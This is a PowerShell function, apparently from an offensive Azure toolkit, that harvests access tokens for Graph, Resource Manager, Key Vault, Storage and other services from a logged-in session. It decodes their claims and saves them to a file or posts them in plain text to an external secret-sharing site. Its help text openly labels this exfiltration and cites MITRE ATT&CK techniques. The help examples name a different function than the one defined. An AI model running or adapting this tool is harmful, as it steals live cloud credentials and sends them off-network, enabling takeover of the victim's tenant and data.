function Export-AzAccessToken {
    [cmdletbinding()]
    [OutputType([string])] # Declares that the function can return a string
    param (
        [Parameter(Mandatory = $false, ValueFromPipelineByPropertyName = $false)]
        [ValidateNotNullOrEmpty()]
        [ValidateSet("MSGraph", "ResourceManager", "KeyVault", "Storage", "Synapse", "OperationalInsights", "Batch", IgnoreCase = $true)]
        [array]$ResourceTypeNames = @("MSGraph", "ResourceManager", "KeyVault", "Storage", "Synapse", "OperationalInsights", "Batch"),

        [Parameter(Mandatory = $false, ValueFromPipelineByPropertyName = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$OutputFile = "accesstokens.json",

        [Parameter(Mandatory = $false, ValueFromPipelineByPropertyName = $true)]
        [switch]$Publish
    )

    begin {
        Write-Host "Starting function $($MyInvocation.MyCommand.Name)" -ForegroundColor Cyan
        Write-Verbose "Starting function $($MyInvocation.MyCommand.Name)"
    }

    process {
        try {
            Write-Host "Requesting access tokens for specified audiences" -ForegroundColor Yellow
            Write-Verbose "Requesting access tokens for specified audiences"
            
            Write-Host "Processing $($ResourceTypeNames.Count) resource types..." -ForegroundColor Magenta
            
            $tokens = @()
            $processingSummary = @()
            $totalResources = $ResourceTypeNames.Count
            $currentIndex = 0

            # Process each resource type sequentially to avoid module loading issues
            foreach ($resourceTypeName in $ResourceTypeNames) {
                $currentIndex++
                $progressPercent = [math]::Round(($currentIndex / $totalResources) * 100)
                
                Write-Host " [$currentIndex/$totalResources] Processing $resourceTypeName... ($progressPercent%)" -ForegroundColor Blue
                
                $startTime = Get-Date
                try {
                    # Import required modules
                    Import-Module Az.Accounts -Force

                    $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName -AsSecureString)
                    $plainToken = ($accessToken.token | ConvertFrom-SecureString -AsPlainText)

                    # Basic JWT parsing without external dependencies
                    $tokenParts = $plainToken.Split('.')
                    if ($tokenParts.Count -ge 2) {
                        try {
                            # Decode the payload (second part of JWT)
                            $payload = $tokenParts[1]
                            # Add padding if needed
                            while ($payload.Length % 4) { $payload += "=" }
                            $payloadBytes = [System.Convert]::FromBase64String($payload)
                            $payloadJson = [System.Text.Encoding]::UTF8.GetString($payloadBytes)
                            $tokenContent = $payloadJson | ConvertFrom-Json

                            $tokenObject = [PSCustomObject]@{
                                Resource = $resourceTypeName
                                UPN      = if ($tokenContent.upn) { $tokenContent.upn } else { "N/A" }
                                Audience = if ($tokenContent.aud) { $tokenContent.aud } else { "N/A" }
                                Roles    = if ($tokenContent.roles) { $tokenContent.roles } else { "N/A" }
                                Scope    = if ($tokenContent.scp) { $tokenContent.scp } else { "N/A" }
                                Tenant   = if ($tokenContent.tid) { $tokenContent.tid } else { "N/A" }
                                Token    = $plainToken
                                Status   = "Success"
                            }
                        }
                        catch {
                            # Fallback if JWT parsing fails
                            $tokenObject = [PSCustomObject]@{
                                Resource = $resourceTypeName
                                UPN      = "N/A"
                                Audience = "N/A"
                                Roles    = "N/A"
                                Scope    = "N/A"
                                Tenant   = "N/A"
                                Token    = $plainToken
                                Status   = "Success (Limited Parsing)"
                            }
                        }
                    } else {
                        # Invalid JWT format
                        $tokenObject = [PSCustomObject]@{
                            Resource = $resourceTypeName
                            UPN      = "N/A"
                            Audience = "N/A"
                            Roles    = "N/A"
                            Scope    = "N/A"
                            Tenant   = "N/A"
                            Token    = $plainToken
                            Status   = "Success (No Parsing)"
                        }
                    }

                    $tokens += $tokenObject
                    
                    $processingTime = (Get-Date) - $startTime
                    $processingSummary += [PSCustomObject]@{
                        Resource = $resourceTypeName
                        Status = "Success"
                        UPN = $tokenObject.UPN
                        Tenant = $tokenObject.Tenant
                        ProcessingTime = "$([math]::Round($processingTime.TotalMilliseconds))ms"
                        Error = $null
                    }
                }
                catch {
                    $processingTime = (Get-Date) - $startTime
                    $processingSummary += [PSCustomObject]@{
                        Resource = $resourceTypeName
                        Status = "Failed"
                        UPN = "N/A"
                        Tenant = "N/A"
                        ProcessingTime = "$([math]::Round($processingTime.TotalMilliseconds))ms"
                        Error = $_.Exception.Message
                    }
                    Write-Error "Failed to get access token for resource type $resourceTypeName : $($_.Exception.Message)"
                }
            }

            # Display comprehensive summary
            Write-Host "`nPROCESSING SUMMARY" -ForegroundColor Cyan
            Write-Host "----------------------------------------" -ForegroundColor Cyan
            $successCount = ($processingSummary | Where-Object { $_.Status -like "*Success*" }).Count
            $failureCount = ($processingSummary | Where-Object { $_.Status -like "*Failed*" }).Count
            
            Write-Host "FINAL RESULTS" -ForegroundColor Cyan
            Write-Host "Successful: $successCount tokens" -ForegroundColor Green
            Write-Host "Failed: $failureCount requests" -ForegroundColor Red
            Write-Host "Total Processed: $totalResources resource types" -ForegroundColor Blue

            if ($Publish) {
                Write-Host "`nPublishing tokens to secure sharing service..." -ForegroundColor Cyan
                $requestParam = @{
                    Uri         = 'https://us.onetimesecret.com/api/v1/share'
                    Method      = 'POST'
                    Body        = @{
                        secret = $tokens | ConvertTo-Json -Depth 10
                        ttl    = 3600
                    }
                }

                $response = Invoke-RestMethod @requestParam
                $secretUrl = "https://us.onetimesecret.com/secret/$($response.secret_key)"
                Write-Host "Tokens published successfully!" -ForegroundColor Green
                Write-Host "Secure URL: $secretUrl" -ForegroundColor Cyan
                return $secretUrl

            } else {
                Write-Host "`nExporting tokens to file..." -ForegroundColor Cyan
                Write-Verbose "Exporting tokens to file $OutputFile"
                $tokens | ConvertTo-Json -Depth 10 | Out-File -FilePath $OutputFile
                Write-Host "Export completed!" -ForegroundColor Green
                Write-Host "File location: $OutputFile" -ForegroundColor Cyan
            }
        }
        catch {
            Write-Host "An error occurred in function $($MyInvocation.MyCommand.Name): $($_.Exception.Message)" -ForegroundColor Red
            Write-Error "An error occurred in function $($MyInvocation.MyCommand.Name): $($_.Exception.Message)"
        }
    }

    end {
        Write-Host "Function $($MyInvocation.MyCommand.Name) completed successfully!" -ForegroundColor Green
        Write-Verbose "Function $($MyInvocation.MyCommand.Name) completed"
    }
    <#
    .SYNOPSIS
        Exports access tokens for specified Azure resource types with enhanced emoji output.

    .DESCRIPTION
        Exports access tokens for specified Azure resource types to a JSON file for exfiltration.
        
    .PARAMETER ResourceTypeNames
        An optional array of strings specifying the Azure resource types for which to request access tokens.
        Supported values are "MSGraph", "ResourceManager", "KeyVault", "Storage", "Synapse", "OperationalInsights", and "Batch".
        The default value includes all supported resource types.

    .PARAMETER OutputFile
        An optional string specifying the path to the file where the tokens will be exported.
        The default value is "accesstokens.json".

    .PARAMETER Publish
        An optional switch parameter. If specified, the tokens will be published to a secure sharing service
        (https://us.onetimesecret.com) instead of being saved to a file. The function will return a URL to access the shared tokens.

    .EXAMPLE
        Export-AzAccessToken-Parallel -ResourceTypeNames @("MSGraph", "ResourceManager") -OutputFile "AccessTokens.json"
        Exports access tokens for "MSGraph" and "ResourceManager" resource types and saves them to "AccessTokens.json".

    .EXAMPLE
        Export-AzAccessToken-Parallel -Publish
        Exports access tokens for all default resource types and publishes them to a secure sharing service.
        Returns a URL to access the shared tokens.

    .NOTES
        This function requires the Azure PowerShell module to be installed and authenticated.
        Uses sequential processing to avoid module loading conflicts while providing rich emoji feedback.
        Includes comprehensive error handling and beautiful progress indicators.

    .LINK
        MITRE ATT&CK Tactic: TA0010 - Exfiltration
        https://attack.mitre.org/tactics/TA0010/

    .LINK
        MITRE ATT&CK Technique: T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage
        https://attack.mitre.org/techniques/T1567/002/
    #>
}
